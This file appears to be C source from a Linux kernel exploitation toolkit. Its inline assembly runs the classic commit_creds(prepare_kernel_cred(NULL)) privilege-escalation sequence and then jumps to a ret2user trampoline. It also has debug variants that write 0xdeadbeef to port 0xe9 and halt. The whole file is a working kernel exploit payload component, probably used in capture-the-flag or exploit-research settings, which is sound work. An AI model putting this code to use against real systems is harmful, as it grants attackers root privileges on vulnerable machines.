#include "privesc.h"
#include "utils.h"

/* Privesc from commit_creds(prepare_kernel_cred(NULL)); */
void privesc_kcred(uintptr_t commit_creds,
                   uintptr_t prepare_kernel_cred,
                   void (*jmp_ret)(void))  // Function pointer to jump back
{
    __asm__ __volatile__ (
        ".intel_syntax noprefix;\n"
        "mov rdi, 0;\n"                     // rdi = NULL
        "mov rax, %[pkc];\n"
        "call rax;\n"                       // prepare_kernel_cred(NULL)
        "mov rdi, rax;\n"                   // rdi = return value (cred)
        "mov rax, %[cc];\n"
        "call rax;\n"                       // commit_creds(cred)
        "mov rax, %[ret];\n"
        "jmp rax;\n"                        // jmp to ret2user_trampoline or any return stub
        ".att_syntax;"
        :
        : [cc]  "r"(commit_creds),
          [pkc] "r"(prepare_kernel_cred),
          [ret] "r"(jmp_ret)
        : "rax", "rdi"
    );
}

/* For debugging use */
void privesc_kcred_test(uintptr_t commit_creds,
                        uintptr_t prepare_kernel_cred)
{
    __asm__ __volatile__ (
        ".intel_syntax noprefix;\n"

        // call prepare_kernel_cred(NULL)
        "xor rdi, rdi;\n"
        "mov rax, %[pkc];\n"
        "call rax;\n"

        // call commit_creds(ret)
        "mov rdi, rax;\n"
        "mov rax, %[cc];\n"
        "call rax;\n"

        // write 0xdeadbeef (byte by byte, big-endian for legibility in debugcon)
        "mov al, 0xde;\n"
        "out 0xe9, al;\n"
        "mov al, 0xad;\n"
        "out 0xe9, al;\n"
        "mov al, 0xbe;\n"
        "out 0xe9, al;\n"
        "mov al, 0xef;\n"
        "out 0xe9, al;\n"

        "cli;\n"
        "hlt;\n"

        ".att_syntax;\n"
        :
        : [cc]  "r"(commit_creds),
          [pkc] "r"(prepare_kernel_cred)
        : "rax", "rdi"
    );
}

void ret_asm_test(void) {
    __asm__ __volatile__ (
        ".intel_syntax noprefix;\n"
        "mov al, 0xde; out 0xe9, al;\n"
        "mov al, 0xad; out 0xe9, al;\n"
        "mov al, 0xbe; out 0xe9, al;\n"
        "mov al, 0xef; out 0xe9, al;\n"
        /*"cli; hlt;\n"*/
        ".att_syntax;"
    );
}

